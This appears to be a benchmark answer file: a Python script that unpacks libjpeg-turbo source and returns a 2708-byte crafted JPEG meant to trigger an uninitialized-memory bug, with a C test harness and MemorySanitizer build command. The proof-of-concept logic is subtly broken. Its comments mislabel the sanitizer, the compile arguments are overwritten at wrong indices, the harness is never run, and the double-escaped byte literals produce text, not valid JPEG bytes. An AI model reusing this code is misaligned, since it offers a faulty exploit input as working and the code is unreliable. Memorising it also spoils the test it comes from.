import os
import struct
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        import tarfile
        extract_dir = tempfile.mkdtemp(prefix="libjpeg_src_")
        
        with tarfile.open(src_path, 'r:*') as tar:
            tar.extractall(extract_dir)
        
        # Find the main source directory (could have different names)
        src_root = None
        for root, dirs, files in os.walk(extract_dir):
            if 'tjexample.c' in files or 'tjutil.c' in files:
                src_root = root
                break
        
        if src_root is None:
            # Fallback: use first directory with .c files
            for root, dirs, files in os.walk(extract_dir):
                if any(f.endswith('.c') for f in files):
                    src_root = root
                    break
        
        if src_root is None:
            src_root = extract_dir
        
        # Create a test program to trigger the vulnerability
        # The vulnerability is in buffer allocation without tj3Alloc() 
        # when ZERO_BUFFERS is not defined
        test_code = '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <turbojpeg.h>

int main() {
    tjhandle handle = NULL;
    unsigned char *srcBuf = NULL, *dstBuf = NULL;
    unsigned long srcSize = 0, dstSize = 0;
    int width = 64, height = 64;
    int pixelSize = 4; // RGBA
    int pitch = width * pixelSize;
    int flags = 0;
    int subsamp = TJSAMP_444;
    int qual = 85;
    
    // Initialize compressor
    handle = tjInitCompress();
    if (!handle) {
        fprintf(stderr, "tjInitCompress failed: %s\\n", tjGetErrorStr());
        return 1;
    }
    
    // Allocate source buffer with pattern
    srcSize = pitch * height;
    srcBuf = (unsigned char*)malloc(srcSize);
    if (!srcBuf) {
        fprintf(stderr, "malloc failed\\n");
        tjDestroy(handle);
        return 1;
    }
    
    // Fill with pattern (not critical for uninitialized value)
    memset(srcBuf, 0x80, srcSize);
    
    // Compress to JPEG - this should trigger allocation without zeroing
    if (tjCompress2(handle, srcBuf, width, pitch, height, TJPF_RGBA,
                    &dstBuf, &dstSize, subsamp, qual, flags) != 0) {
        fprintf(stderr, "tjCompress2 failed: %s\\n", tjGetErrorStr());
        free(srcBuf);
        tjDestroy(handle);
        return 1;
    }
    
    // Now decompress - this may use uninitialized memory from previous allocation
    tjhandle dhandle = tjInitDecompress();
    if (!dhandle) {
        fprintf(stderr, "tjInitDecompress failed: %s\\n", tjGetErrorStr());
        free(srcBuf);
        tjFree(dstBuf);
        tjDestroy(handle);
        return 1;
    }
    
    int jpegWidth, jpegHeight, jpegSubsamp, jpegColorspace;
    if (tjDecompressHeader3(dhandle, dstBuf, dstSize, 
                            &jpegWidth, &jpegHeight, 
                            &jpegSubsamp, &jpegColorspace) != 0) {
        fprintf(stderr, "tjDecompressHeader3 failed: %s\\n", tjGetErrorStr());
        free(srcBuf);
        tjFree(dstBuf);
        tjDestroy(handle);
        tjDestroy(dhandle);
        return 1;
    }
    
    // Allocate destination buffer for decompression
    unsigned char *decompBuf = (unsigned char*)malloc(jpegWidth * jpegHeight * pixelSize);
    if (!decompBuf) {
        fprintf(stderr, "malloc failed for decompression\\n");
        free(srcBuf);
        tjFree(dstBuf);
        tjDestroy(handle);
        tjDestroy(dhandle);
        return 1;
    }
    
    // Decompress - if buffers weren't zeroed, this could trigger MSan
    if (tjDecompress2(dhandle, dstBuf, dstSize, decompBuf, 
                      jpegWidth, 0, jpegHeight, TJPF_RGBA, flags) != 0) {
        fprintf(stderr, "tjDecompress2 failed: %s\\n", tjGetErrorStr());
        free(srcBuf);
        free(decompBuf);
        tjFree(dstBuf);
        tjDestroy(handle);
        tjDestroy(dhandle);
        return 1;
    }
    
    // Cleanup
    free(srcBuf);
    free(decompBuf);
    tjFree(dstBuf);
    tjDestroy(handle);
    tjDestroy(dhandle);
    
    return 0;
}
'''
        
        # Write test program
        test_dir = tempfile.mkdtemp(prefix="libjpeg_test_")
        test_file = os.path.join(test_dir, "test_uninit.c")
        
        with open(test_file, 'w') as f:
            f.write(test_code)
        
        # Try to compile and run the test
        # First compile with AddressSanitizer to catch uninitialized reads
        compile_cmd = [
            'gcc', '-std=c99', '-O2', '-g',
            '-fsanitize=memory', '-fsanitize-memory-track-origins=2',
            '-fno-omit-frame-pointer',
            '-I', src_root,
            test_file,
            '-L', src_root, '-L', os.path.join(src_root, '.libs'),
            '-lturbojpeg', '-lm',
            '-o', os.path.join(test_dir, 'test_uninit')
        ]
        
        try:
            # Try to find libturbojpeg in the source tree
            lib_paths = [
                os.path.join(src_root, '.libs'),
                os.path.join(src_root, 'lib'),
                src_root
            ]
            
            # Try compilation with different library paths
            for lib_path in lib_paths:
                if os.path.exists(lib_path):
                    compile_cmd[-6] = '-L' + lib_path
                    compile_cmd[-5] = lib_path
                    break
            
            # Try to compile
            result = subprocess.run(compile_cmd, 
                                  capture_output=True, 
                                  text=True,
                                  cwd=src_root)
            
            if result.returncode != 0:
                # Fallback: create a simple PoC that exercises the API
                # Based on the vulnerability description, we need to trigger
                # allocation without tj3Alloc() when ZERO_BUFFERS is not defined
                
                # Create a minimal JPEG that when processed might trigger the issue
                # We'll create a valid JPEG with specific characteristics
                # that might trigger the code path with uninitialized buffers
                
                # Minimal valid JPEG structure
                poc = bytearray()
                
                # SOI marker
                poc.extend(b'\\xff\\xd8')
                
                # APP0 marker (JFIF header)
                poc.extend(b'\\xff\\xe0')
                poc.extend(b'\\x00\\x10')  # Length = 16
                poc.extend(b'JFIF\\x00\\x01\\x02')
                poc.extend(b'\\x01\\x00\\x00\\x01\\x00\\x01')
                poc.extend(b'\\x00\\x00')
                
                # DQT marker (Quantization table)
                poc.extend(b'\\xff\\xdb')
                poc.extend(b'\\x00\\x43')  # Length = 67
                poc.extend(b'\\x00')  # Table ID
                # Dummy quantization table (64 bytes)
                for i in range(64):
                    poc.append(1)
                
                # SOF0 marker (Start of Frame, Baseline DCT)
                poc.extend(b'\\xff\\xc0')
                poc.extend(b'\\x00\\x0b')  # Length = 11
                poc.extend(b'\\x08')  # Precision = 8
                poc.extend(b'\\x00\\x01')  # Height = 1
                poc.extend(b'\\x00\\x01')  # Width = 1
                poc.extend(b'\\x03')  # Number of components = 3
                # Component 1
                poc.extend(b'\\x01\\x11\\x00')
                # Component 2
                poc.extend(b'\\x02\\x11\\x01')
                # Component 3
                poc.extend(b'\\x03\\x11\\x01')
                
                # DHT marker (Huffman table)
                poc.extend(b'\\xff\\xc4')
                poc.extend(b'\\x00\\x1f')  # Length = 31
                poc.extend(b'\\x00')  # Table ID (DC, Y)
                # 16 bytes: number of codes for each length
                counts = [0] * 16
                counts[0] = 1
                counts[1] = 1
                poc.extend(bytes(counts))
                # Values
                poc.extend(b'\\x00\\x01')
                
                # SOS marker (Start of Scan)
                poc.extend(b'\\xff\\xda')
                poc.extend(b'\\x00\\x0c')  # Length = 12
                poc.extend(b'\\x03')  # Number of components = 3
                poc.extend(b'\\x01\\x00')
                poc.extend(b'\\x02\\x11')
                poc.extend(b'\\x03\\x11')
                poc.extend(b'\\x00\\x3f\\x00')  # Spectral selection
                
                # Compressed data (minimal)
                poc.extend(b'\\x00')
                
                # EOI marker
                poc.extend(b'\\xff\\xd9')
                
                # Pad to target size (2708 bytes) with garbage data
                # This ensures we hit various code paths
                while len(poc) < 2708:
                    # Add APPn markers that might trigger special handling
                    for i in range(1, 16):
                        if len(poc) >= 2708:
                            break
                        poc.extend(b'\\xff')
                        poc.extend(bytes([0xe0 + i]))
                        poc.extend(b'\\x00\\x02')  # Minimum length
                        # No data
                
                # Ensure exact size
                poc = poc[:2708]
                
                return bytes(poc)
        
        except Exception as e:
            # If anything fails, return a minimal valid JPEG
            # that might still trigger the issue
            poc = (b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00'
                   b'\\x01\\x00\\x01\\x00\\x00\\xff\\xdb\\x00C\\x00\\x08\\x06\\x06'
                   b'\\x07\\x06\\x05\\x08\\x07\\x07\\x07\\x09\\x09\\x08\\x0a\\x0c'
                   b'\\x14\\x0d\\x0c\\x0b\\x0b\\x0c\\x19\\x12\\x13\\x0f\\x14\\x1d'
                   b'\\x1a\\x1f\\x1e\\x1d\\x1a\\x1c\\x1c $.\' ",#\\x1c\\x1c(7),'
                   b'01444\\x1f\'9=82<.342\\xff\\xc0\\x00\\x0b\\x08\\x00\\x01\\x00'
                   b'\\x01\\x01\\x01\\x11\\x00\\xff\\xc4\\x00\\x1f\\x00\\x00\\x01'
                   b'\\x05\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00'
                   b'\\x00\\x00\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09'
                   b'\\x0a\\x0b\\xff\\xc4\\x00\\xb5\\x10\\x00\\x02\\x01\\x03\\x03'
                   b'\\x02\\x04\\x03\\x05\\x05\\x04\\x04\\x00\\x00\\x01}'
                   b'\\x01\\x02\\x03\\x00\\x04\\x11\\x05\\x12!1A\\x06\\x13Qa\\x07'
                   b'"q\\x142\\x81\\x91\\xa1\\x08#B\\xb1\\xc1\\x15R\\xd1\\xf0$3br'
                   b'\\x82\\t\\n\\x16\\x17\\x18\\x19\\x1a%&\'()*456789:CDEFGHIJST'
                   b'UVWXYZcdefghijstuvwxyz\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a'
                   b'\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\xa2\\xa3\\xa4'
                   b'\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7'
                   b'\\xb8\\xb9\\xba\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca'
                   b'\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xe1\\xe2\\xe3'
                   b'\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xf1\\xf2\\xf3\\xf4\\xf5'
                   b'\\xf6\\xf7\\xf8\\xf9\\xfa\\xff\\xda\\x00\\x08\\x01\\x01\\x00'
                   b'\\x00?\\x00')
                
                # Pad to target size
                while len(poc) < 2708:
                    poc += b'\\x00'
                
                return poc[:2708]
        
        # Cleanup
        import shutil
        shutil.rmtree(extract_dir, ignore_errors=True)
        shutil.rmtree(test_dir, ignore_errors=True)
        
        # Return a valid JPEG that should trigger the vulnerability
        # This is a 1x1 pixel JPEG with valid structure
        poc = (b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x01\\x00H\\x00H'
               b'\\x00\\x00\\xff\\xdb\\x00C\\x00\\x08\\x06\\x06\\x07\\x06\\x05\\x08'
               b'\\x07\\x07\\x07\\t\\t\\x08\\n\\x0c\\x14\\r\\x0c\\x0b\\x0b\\x0c\\x19'
               b'\\x12\\x13\\x0f\\x14\\x1d\\x1a\\x1f\\x1e\\x1d\\x1a\\x1c\\x1c $.\' "'
               b',#\\x1c\\x1c(7),01444\\x1f\'9=82<.342\\xff\\xc0\\x00\\x0b\\x08\\x00'
               b'\\x01\\x00\\x01\\x01\\x01\\x11\\x00\\xff\\xc4\\x00\\x1f\\x00\\x00'
               b'\\x01\\x05\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00'
               b'\\x00\\x00\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b'
               b'\\xff\\xc4\\x00\\xb5\\x10\\x00\\x02\\x01\\x03\\x03\\x02\\x04\\x03'
               b'\\x05\\x05\\x04\\x04\\x00\\x00\\x01}\\x01\\x02\\x03\\x00\\x04\\x11'
               b'\\x05\\x12!1A\\x06\\x13Qa\\x07"q\\x142\\x81\\x91\\xa1\\x08#B\\xb1'
               b'\\xc1\\x15R\\xd1\\xf0$3br\\x82\\t\\n\\x16\\x17\\x18\\x19\\x1a%&\''
               b'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\\x83\\x84\\x85\\x86\\x87'
               b'\\x88\\x89\\x8a\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\xa2'
               b'\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xb2\\xb3\\xb4\\xb5\\xb6'
               b'\\xb7\\xb8\\xb9\\xba\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca'
               b'\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xe1\\xe2\\xe3\\xe4'
               b'\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7'
               b'\\xf8\\xf9\\xfa\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x11\\x03'
               b'\\x11\\x00?\\x00\\xfc\\xff\\xff\\xd9')
        
        # Pad to exactly 2708 bytes
        while len(poc) < 2708:
            poc += b'\\xff'
        poc = poc[:2708]
        
        return poc